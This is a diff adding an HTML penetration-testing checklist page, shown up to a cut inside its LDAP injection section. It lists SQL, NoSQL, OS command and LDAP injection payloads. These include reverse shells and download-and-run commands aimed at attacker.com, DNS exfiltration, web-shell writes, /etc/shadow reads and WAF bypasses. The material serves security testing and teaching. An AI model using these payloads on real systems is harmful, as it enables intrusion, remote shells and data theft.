@@ -1,0 +1,2641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web VAPT Checklist — Complete Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #080c10;
+    --bg2: #0d1117;
+    --bg3: #111820;
+    --bg4: #161e28;
+    --border: #1e3a4a;
+    --accent: #00d4ff;
+    --accent2: #00ff88;
+    --accent3: #ff6b35;
+    --accent4: #ff3c78;
+    --accent5: #b060ff;
+    --text: #c9d8e8;
+    --text2: #7a9ab0;
+    --text3: #4a6a7a;
+    --mono: 'Share Tech Mono', monospace;
+    --display: 'Orbitron', sans-serif;
+    --body: 'Exo 2', sans-serif;
+    --glow: 0 0 20px rgba(0,212,255,0.15);
+    --glow2: 0 0 20px rgba(0,255,136,0.15);
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-weight: 300;
+    display: flex;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* SIDEBAR */
+  #sidebar {
+    width: 280px;
+    min-width: 280px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    position: fixed;
+    top: 0; left: 0;
+    height: 100vh;
+    overflow-y: auto;
+    z-index: 100;
+    display: flex;
+    flex-direction: column;
+  }
+  #sidebar::-webkit-scrollbar { width: 4px; }
+  #sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  .sidebar-header {
+    padding: 24px 20px 16px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg3);
+  }
+  .sidebar-header h1 {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 900;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    line-height: 1.4;
+  }
+  .sidebar-header p {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    margin-top: 6px;
+  }
+  #search-box {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  #search-input {
+    width: 100%;
+    background: var(--bg4);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 8px 12px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  #search-input:focus { border-color: var(--accent); }
+  #search-input::placeholder { color: var(--text3); }
+  .nav-list { padding: 8px 0; flex: 1; }
+  .nav-item {
+    display: block;
+    padding: 8px 20px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text2);
+    text-decoration: none;
+    border-left: 2px solid transparent;
+    transition: all 0.2s;
+    cursor: pointer;
+    line-height: 1.4;
+  }
+  .nav-item:hover, .nav-item.active {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(0,212,255,0.05);
+  }
+  .nav-item .num {
+    color: var(--text3);
+    margin-right: 6px;
+  }
+  .nav-cat {
+    padding: 12px 20px 4px;
+    font-family: var(--display);
+    font-size: 9px;
+    color: var(--text3);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  /* MAIN */
+  #main {
+    margin-left: 280px;
+    flex: 1;
+    min-width: 0;
+  }
+  .hero {
+    background: linear-gradient(135deg, var(--bg2) 0%, var(--bg3) 50%, #0a1520 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 60px 60px 50px;
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -50%; left: -10%;
+    width: 60%; height: 200%;
+    background: radial-gradient(ellipse, rgba(0,212,255,0.04) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero::after {
+    content: 'VAPT';
+    position: absolute;
+    right: 60px; top: 50%;
+    transform: translateY(-50%);
+    font-family: var(--display);
+    font-size: 120px;
+    font-weight: 900;
+    color: rgba(0,212,255,0.03);
+    letter-spacing: -5px;
+    pointer-events: none;
+  }
+  .hero h1 {
+    font-family: var(--display);
+    font-size: 36px;
+    font-weight: 900;
+    color: #fff;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    line-height: 1.1;
+  }
+  .hero h1 span { color: var(--accent); }
+  .hero p {
+    margin-top: 14px;
+    font-size: 14px;
+    color: var(--text2);
+    max-width: 550px;
+    line-height: 1.7;
+  }
+  .hero-stats {
+    display: flex;
+    gap: 40px;
+    margin-top: 28px;
+    flex-wrap: wrap;
+  }
+  .stat {
+    text-align: left;
+  }
+  .stat-val {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--accent2);
+  }
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin-top: 2px;
+  }
+
+  /* CONTENT */
+  #content { padding: 0 60px 80px; }
+
+  /* VULN CARD */
+  .vuln-card {
+    margin-top: 48px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    background: var(--bg2);
+    transition: border-color 0.3s;
+  }
+  .vuln-card:hover { border-color: rgba(0,212,255,0.3); }
+  .vuln-header {
+    padding: 24px 28px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    gap: 20px;
+    cursor: pointer;
+    user-select: none;
+  }
+  .vuln-num {
+    font-family: var(--display);
+    font-size: 11px;
+    color: var(--accent);
+    background: rgba(0,212,255,0.1);
+    border: 1px solid rgba(0,212,255,0.3);
+    padding: 4px 10px;
+    border-radius: 3px;
+    white-space: nowrap;
+    margin-top: 2px;
+  }
+  .vuln-title-block { flex: 1; }
+  .vuln-name {
+    font-family: var(--display);
+    font-size: 16px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+  }
+  .vuln-short {
+    font-size: 13px;
+    color: var(--text2);
+    margin-top: 4px;
+    line-height: 1.5;
+  }
+  .severity-badge {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 3px 10px;
+    border-radius: 3px;
+    white-space: nowrap;
+    border: 1px solid;
+    margin-top: 2px;
+  }
+  .sev-critical { color: #ff3c78; border-color: #ff3c78; background: rgba(255,60,120,0.1); }
+  .sev-high { color: var(--accent3); border-color: var(--accent3); background: rgba(255,107,53,0.1); }
+  .sev-medium { color: #ffd700; border-color: #ffd700; background: rgba(255,215,0,0.08); }
+  .sev-low { color: var(--accent2); border-color: var(--accent2); background: rgba(0,255,136,0.08); }
+
+  .vuln-body { padding: 28px 28px 32px; }
+  .vuln-body.collapsed { display: none; }
+
+  .section-label {
+    font-family: var(--display);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+    margin-top: 24px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .section-label::before {
+    content: '';
+    display: inline-block;
+    width: 16px;
+    height: 1px;
+    background: var(--accent);
+  }
+  .section-label:first-child { margin-top: 0; }
+
+  /* FIELDS */
+  .field-row {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin-bottom: 10px;
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.7;
+  }
+  .field-row strong {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text3);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    display: block;
+    margin-bottom: 6px;
+  }
+  ul.location-list {
+    list-style: none;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-top: 4px;
+  }
+  ul.location-list li {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: var(--bg4);
+    border: 1px solid var(--border);
+    color: var(--accent2);
+    padding: 3px 10px;
+    border-radius: 3px;
+  }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: #060a0e;
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    border-radius: 4px;
+    padding: 16px 18px;
+    margin: 8px 0;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: #a8d8ea;
+    line-height: 1.8;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .code-block.green { border-left-color: var(--accent2); color: #a8ffca; }
+  .code-block.orange { border-left-color: var(--accent3); color: #ffcba8; }
+  .code-block.red { border-left-color: var(--accent4); color: #ffa8c0; }
+  .code-block.purple { border-left-color: var(--accent5); color: #d4a8ff; }
+
+  /* PAYLOAD GROUPS */
+  .payload-group {
+    margin-bottom: 16px;
+  }
+  .payload-title {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent3);
+    margin-bottom: 6px;
+    letter-spacing: 0.5px;
+  }
+  .payload-title::before { content: '▸ '; }
+
+  /* TOOLS */
+  .tools-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 6px;
+  }
+  .tool-badge {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: rgba(176,96,255,0.1);
+    border: 1px solid rgba(176,96,255,0.3);
+    color: var(--accent5);
+    padding: 4px 12px;
+    border-radius: 3px;
+  }
+
+  /* IMPACT */
+  .impact-list {
+    list-style: none;
+    margin-top: 6px;
+  }
+  .impact-list li {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--accent4);
+    padding: 3px 0;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .impact-list li::before { content: '✦'; font-size: 10px; }
+
+  /* REFS */
+  .ref-list {
+    list-style: none;
+    margin-top: 6px;
+  }
+  .ref-list li {
+    padding: 4px 0;
+  }
+  .ref-list a {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    text-decoration: none;
+    transition: color 0.2s;
+  }
+  .ref-list a:hover { color: var(--accent2); text-decoration: underline; }
+
+  /* GRID LAYOUT */
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 10px;
+  }
+  @media (max-width: 900px) {
+    .two-col { grid-template-columns: 1fr; }
+    #sidebar { width: 240px; min-width: 240px; }
+    #main { margin-left: 240px; }
+    .hero { padding: 40px 30px; }
+    #content { padding: 0 30px 60px; }
+  }
+
+  /* TOP TOGGLE */
+  .toggle-all-bar {
+    padding: 16px 60px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    gap: 12px;
+    align-items: center;
+  }
+  .btn {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: var(--bg4);
+    border: 1px solid var(--border);
+    color: var(--text2);
+    padding: 6px 16px;
+    border-radius: 3px;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.5px;
+  }
+  .btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,212,255,0.05);
+  }
+  .btn-label { font-family: var(--mono); font-size: 11px; color: var(--text3); }
+
+  /* SCROLL TOP */
+  #scroll-top {
+    position: fixed;
+    bottom: 28px;
+    right: 28px;
+    background: var(--bg3);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-family: var(--mono);
+    font-size: 16px;
+    width: 40px; height: 40px;
+    border-radius: 4px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+    z-index: 200;
+    opacity: 0;
+    pointer-events: none;
+  }
+  #scroll-top.show { opacity: 1; pointer-events: all; }
+  #scroll-top:hover { background: var(--accent); color: var(--bg); }
+
+  /* DIVIDER */
+  .section-divider {
+    margin: 40px 0 0;
+    padding: 16px 28px;
+    background: var(--bg4);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-family: var(--display);
+    font-size: 11px;
+    letter-spacing: 3px;
+    color: var(--text3);
+    text-transform: uppercase;
+  }
+
+  /* HIGHLIGHT */
+  mark {
+    background: rgba(0,212,255,0.2);
+    color: var(--accent);
+    border-radius: 2px;
+    padding: 0 2px;
+  }
+
+  .chevron { transition: transform 0.2s; display: inline-block; margin-left: auto; color: var(--text3); font-size: 14px; }
+  .collapsed-header .chevron { transform: rotate(-90deg); }
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="sidebar-header">
+    <h1>WEB VAPT<br>CHECKLIST</h1>
+    <p>// COMPLETE REFERENCE v2.0</p>
+  </div>
+  <div id="search-box">
+    <input type="text" id="search-input" placeholder="🔍 Search vulnerabilities..." oninput="searchVulns(this.value)">
+  </div>
+  <div class="nav-list" id="nav-list">
+    <div class="nav-cat">Injection</div>
+    <a class="nav-item" href="#v1"><span class="num">01</span> SQL Injection</a>
+    <a class="nav-item" href="#v2"><span class="num">02</span> NoSQL Injection</a>
+    <a class="nav-item" href="#v3"><span class="num">03</span> OS Command Injection</a>
+    <a class="nav-item" href="#v4"><span class="num">04</span> LDAP Injection</a>
+    <a class="nav-item" href="#v5"><span class="num">05</span> XPath/XML Injection</a>
+    <a class="nav-item" href="#v6"><span class="num">06</span> SSTI</a>
+    <div class="nav-cat">XSS / Client-Side</div>
+    <a class="nav-item" href="#v7"><span class="num">07</span> Reflected XSS</a>
+    <a class="nav-item" href="#v8"><span class="num">08</span> Stored XSS</a>
+    <a class="nav-item" href="#v9"><span class="num">09</span> DOM-Based XSS</a>
+    <a class="nav-item" href="#v10"><span class="num">10</span> Clickjacking</a>
+    <div class="nav-cat">Request Forgery</div>
+    <a class="nav-item" href="#v11"><span class="num">11</span> CSRF</a>
+    <a class="nav-item" href="#v12"><span class="num">12</span> SSRF</a>
+    <a class="nav-item" href="#v13"><span class="num">13</span> XXE</a>
+    <a class="nav-item" href="#v14"><span class="num">14</span> HTTP Request Smuggling</a>
+    <div class="nav-cat">Auth & Access</div>
+    <a class="nav-item" href="#v15"><span class="num">15</span> Broken Authentication</a>
+    <a class="nav-item" href="#v16"><span class="num">16</span> IDOR</a>
+    <a class="nav-item" href="#v17"><span class="num">17</span> JWT Vulnerabilities</a>
+    <a class="nav-item" href="#v18"><span class="num">18</span> OAuth Flaws</a>
+    <div class="nav-cat">File & Path</div>
+    <a class="nav-item" href="#v19"><span class="num">19</span> File Upload</a>
+    <a class="nav-item" href="#v20"><span class="num">20</span> Path Traversal</a>
+    <a class="nav-item" href="#v21"><span class="num">21</span> LFI / RFI</a>
+    <div class="nav-cat">Config & Misc</div>
+    <a class="nav-item" href="#v22"><span class="num">22</span> CORS Misconfiguration</a>
+    <a class="nav-item" href="#v23"><span class="num">23</span> Security Misconfig</a>
+    <a class="nav-item" href="#v24"><span class="num">24</span> Open Redirect</a>
+    <a class="nav-item" href="#v25"><span class="num">25</span> Insecure Deserialization</a>
+    <a class="nav-item" href="#v26"><span class="num">26</span> Business Logic</a>
+    <a class="nav-item" href="#v27"><span class="num">27</span> GraphQL Injection</a>
+    <a class="nav-item" href="#v28"><span class="num">28</span> Rate Limiting / Brute Force</a>
+    <a class="nav-item" href="#v29"><span class="num">29</span> Subdomain Takeover</a>
+    <a class="nav-item" href="#v30"><span class="num">30</span> Sensitive Data Exposure</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div id="main">
+  <div class="hero">
+    <h1>WEB APPLICATION<br><span>VAPT CHECKLIST</span></h1>
+    <p>A complete penetration testing reference covering detection payloads, exploitation techniques, tools, and remediation guidance for all major web vulnerabilities.</p>
+    <div class="hero-stats">
+      <div class="stat"><div class="stat-val">30</div><div class="stat-label">Vulnerabilities</div></div>
+      <div class="stat"><div class="stat-val">500+</div><div class="stat-label">Payloads</div></div>
+      <div class="stat"><div class="stat-val">60+</div><div class="stat-label">Tools Listed</div></div>
+      <div class="stat"><div class="stat-val">OWASP</div><div class="stat-label">Aligned</div></div>
+    </div>
+  </div>
+
+  <div class="toggle-all-bar">
+    <span class="btn-label">// View:</span>
+    <button class="btn" onclick="expandAll()">▼ Expand All</button>
+    <button class="btn" onclick="collapseAll()">▲ Collapse All</button>
+  </div>
+
+  <div id="content">
+
+<!-- ==================== V1: SQL INJECTION ==================== -->
+<div class="vuln-card" id="v1">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">01</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SQL INJECTION (SQLi)</div>
+      <div class="vuln-short">User input inserted into SQL queries without sanitization, allowing DB manipulation.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list">
+      <li>Login Forms</li><li>Search Fields</li><li>URL Parameters</li><li>POST Body</li>
+      <li>Cookies</li><li>HTTP Headers</li><li>API JSON Params</li><li>Order/Filter Fields</li>
+    </ul>
+    <div class="section-label">Detection Payloads</div>
+    <div class="payload-group"><div class="payload-title">Basic Error Triggers</div>
+<div class="code-block">'
+"
+`
+'--
+'#
+');--
+" OR "1"="1
+' OR '1'='1
+1'
+1"
+1`
+\
+;;
+%27
+%22</div></div>
+    <div class="payload-group"><div class="payload-title">Boolean-Based Detection</div>
+<div class="code-block green">1 AND 1=1   → normal response
+1 AND 1=2   → different response (confirms SQLi)
+1 AND 1=1-- -
+1 AND 2>1
+1 AND 'a'='a'
+1 AND 'a'='b'</div></div>
+    <div class="section-label">Exploitation Payloads</div>
+    <div class="payload-group"><div class="payload-title">Authentication Bypass</div>
+<div class="code-block orange">admin'--
+admin'#
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1'--
+' OR 'x'='x
+" OR "1"="1"--
+admin' AND '1'='1
+' OR 1=1 LIMIT 1--
+username=admin'--&password=anything
+username=' OR 1=1--&password=anything</div></div>
+    <div class="payload-group"><div class="payload-title">UNION-Based (column discovery)</div>
+<div class="code-block">-- Step 1: Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   ← error here = 2 columns
+
+-- Step 2: Find injectable position
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+-- Step 3: Extract data
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</div></div>
+    <div class="payload-group"><div class="payload-title">Error-Based (MySQL)</div>
+<div class="code-block red">AND extractvalue(1,concat(0x7e,(SELECT version())))--
+AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),(SELECT version()),CHAR(95),CHAR(33),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--</div></div>
+    <div class="payload-group"><div class="payload-title">Time-Based Blind SQLi</div>
+<div class="code-block purple">-- MySQL
+1 AND SLEEP(5)--
+' AND SLEEP(5)--
+1; SELECT SLEEP(5)--
+
+-- MSSQL
+1; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+1; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+
+-- Oracle
+1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--</div></div>
+    <div class="payload-group"><div class="payload-title">Out-of-Band / DNS Exfil</div>
+<div class="code-block">' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--
+'; exec master..xp_dirtree '//attacker.com/a'--  (MSSQL)
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--</div></div>
+    <div class="payload-group"><div class="payload-title">Database Fingerprinting</div>
+<div class="code-block green">-- MySQL
+' AND SUBSTRING(version(),1,1)='5'--
+-- PostgreSQL  
+' AND version() LIKE '%PostgreSQL%'--
+-- MSSQL
+' AND @@version LIKE '%Microsoft%'--
+-- Oracle
+' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--</div></div>
+    <div class="section-label">Testing Method</div>
+    <div class="field-row"><strong>Manual Steps</strong>
+1. Identify all input vectors (forms, params, headers, cookies)<br>
+2. Inject a single quote (') and observe error messages<br>
+3. Try boolean-based payloads and compare responses<br>
+4. Use ORDER BY to determine column count<br>
+5. Use UNION SELECT to extract data<br>
+6. If blind, use time-based or DNS-exfil methods<br>
+7. Enumerate: version(), database(), tables, columns, data</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row">
+      <span class="tool-badge">SQLMap</span><span class="tool-badge">Burp Suite</span>
+      <span class="tool-badge">Havij</span><span class="tool-badge">jSQL</span>
+      <span class="tool-badge">BBQSQL</span><span class="tool-badge">NoSQLMap</span>
+    </div>
+<div class="code-block green">sqlmap -u "https://target.com/item?id=1" --dbs
+sqlmap -u "https://target.com/item?id=1" -D dbname --tables
+sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump
+sqlmap -r request.txt --level=5 --risk=3 --batch
+sqlmap -u "https://target.com/" --data="user=a&pass=b" -p user --dbs</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list">
+      <li>Full database dump (credentials, PII)</li>
+      <li>Authentication bypass</li>
+      <li>Data modification / deletion</li>
+      <li>Remote code execution (xp_cmdshell / UDF)</li>
+      <li>Server file read/write</li>
+    </ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQLi Labs</a></li>
+      <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
+      <li><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">PayloadBox SQL Injection List</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">PayloadsAllTheThings - SQLi</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V2: NoSQL INJECTION ==================== -->
+<div class="vuln-card" id="v2">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">02</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">NoSQL INJECTION</div>
+      <div class="vuln-short">Injection into MongoDB, CouchDB, Redis queries via operator abuse or type confusion.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>Login Forms</li><li>JSON POST body</li><li>URL params</li><li>API Endpoints</li><li>Search Fields</li></ul>
+    <div class="section-label">Detection Payloads</div>
+<div class="code-block">// URL parameter injection
+?username[$ne]=test
+?username[$gt]=
+?username[$regex]=.*
+
+// JSON body injection
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}</div>
+    <div class="section-label">Exploitation Payloads</div>
+    <div class="payload-group"><div class="payload-title">Authentication Bypass (MongoDB)</div>
+<div class="code-block orange">// POST body - JSON
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+{"username": "admin", "password": {"$ne": "wrong"}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+
+// URL param style
+username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&password[$ne]=lol
+username[$exists]=true&password[$exists]=true</div></div>
+    <div class="payload-group"><div class="payload-title">Data Extraction (Blind - MongoDB)</div>
+<div class="code-block purple">// Extract field character by character
+{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
+{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
+
+// JavaScript injection ($where)
+{"$where": "this.username == 'admin'"}
+{"$where": "sleep(5000)"}  // time-based
+{"$where": "return (this.password.match(/^a/))"}
+
+// $lookup abuse
+{"username": {"$lookup": {"from": "users"}}}</div></div>
+    <div class="payload-group"><div class="payload-title">Redis Injection</div>
+<div class="code-block red">// CRLF injection into Redis commands
+test\r\nSET injected "hacked"\r\n
+test\r\nCONFIG SET dir /var/www/html\r\n
+test\r\nCONFIG SET dbfilename shell.php\r\n</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">NoSQLMap</span><span class="tool-badge">Burp Suite</span><span class="tool-badge">nosqli</span></div>
+<div class="code-block green">nosqlmap --attack db --url "http://target.com/login" --postdata "user=INJECT&pass=test"</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Authentication bypass</li><li>Data exfiltration</li><li>DoS via slow queries</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" target="_blank">OWASP NoSQL Injection Testing</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank">PayloadsAllTheThings - NoSQLi</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V3: OS COMMAND INJECTION ==================== -->
+<div class="vuln-card" id="v3">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">03</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">OS COMMAND INJECTION</div>
+      <div class="vuln-short">Application passes user input to shell commands without sanitization.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>Ping/Traceroute tools</li><li>File conversion features</li><li>Email fields</li><li>Filename params</li><li>DNS lookup tools</li><li>Network utils</li></ul>
+    <div class="section-label">Detection Payloads</div>
+<div class="code-block">; ls
+| ls
+|| ls
+& ls
+&& ls
+` ls `
+$(ls)
+; sleep 5
+| sleep 5
+|| sleep 5
+; ping -c 5 attacker.com
+$(ping -c 1 attacker.com)</div>
+    <div class="section-label">Exploitation Payloads</div>
+    <div class="payload-group"><div class="payload-title">Linux Payloads</div>
+<div class="code-block orange">; id; whoami; uname -a
+| cat /etc/passwd
+&& cat /etc/shadow
+; ls -la /
+$(cat /etc/passwd)
+`cat /etc/passwd`
+; curl http://attacker.com/$(whoami)
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; wget http://attacker.com/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh</div></div>
+    <div class="payload-group"><div class="payload-title">Windows Payloads</div>
+<div class="code-block red">& dir
+| type C:\Windows\win.ini
+& whoami
+& ipconfig /all
+& net user
+& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+& cmd /c "certutil -urlcache -split -f http://attacker.com/nc.exe c:\nc.exe"</div></div>
+    <div class="payload-group"><div class="payload-title">Blind OS Command Injection</div>
+<div class="code-block purple">// Time-based detection
+; sleep 10
+|| ping -c 10 127.0.0.1
+
+// Out-of-band detection
+; nslookup attacker.com
+; curl http://burp-collab.com/$(whoami)
+; wget http://attacker.com/?output=$(id|base64)</div></div>
+    <div class="payload-group"><div class="payload-title">WAF Bypass Techniques</div>
+<div class="code-block">;{ls,-la}
+;l\s
+;/bin/l's'
+;$(printf '\x6c\x73')  # ls hex encoded
+;$IFS$9ls     # IFS bypass
+;cat$IFS/etc/passwd
+;c${u}at /etc/passwd</div></div>
+    <div class="section-label">Testing Method</div>
+    <div class="field-row"><strong>Manual Steps</strong>
+1. Find parameters passed to system functions<br>
+2. Inject command separators (;, |, &, &&, ||)<br>
+3. Use time-delay to confirm blind injection (sleep 5)<br>
+4. Use out-of-band (DNS/HTTP) to exfiltrate data<br>
+5. Escalate to full shell access</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">commix</span><span class="tool-badge">Burp Collaborator</span></div>
+<div class="code-block green">commix --url="http://target.com/ping?host=INJECT" --level=3</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Full server compromise</li><li>Reverse shell / RCE</li><li>File system access</li><li>Lateral movement</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/os-command-injection" target="_blank">PortSwigger OS Command Injection</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank">PayloadsAllTheThings - CMDi</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V4: LDAP INJECTION ==================== -->
+<div class="vuln-card" id="v4">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">04</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">LDAP INJECTION</div>
+      <div class="vuln-short">Manipulating LDAP queries to bypass authentication or extract directory data.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>Login Forms</li><li>Directory Search</li><li>User Lookup fields</li><li>Corporate SSO</li></ul>
+    <div class="section-label">Detection & Exploitation Payloads</div>
+<div class="code-block orange">// Authentication bypass
+*)(uid=*))(|(uid=*
+admin)(&)
+admin)(|(password=*)
+*)(|(objectclass=*))
+
+// Blind extraction - enumerate characters
+*)(uid=a*     → returns users starting with 'a'
+*)(uid=ad*    → continue character by character
+
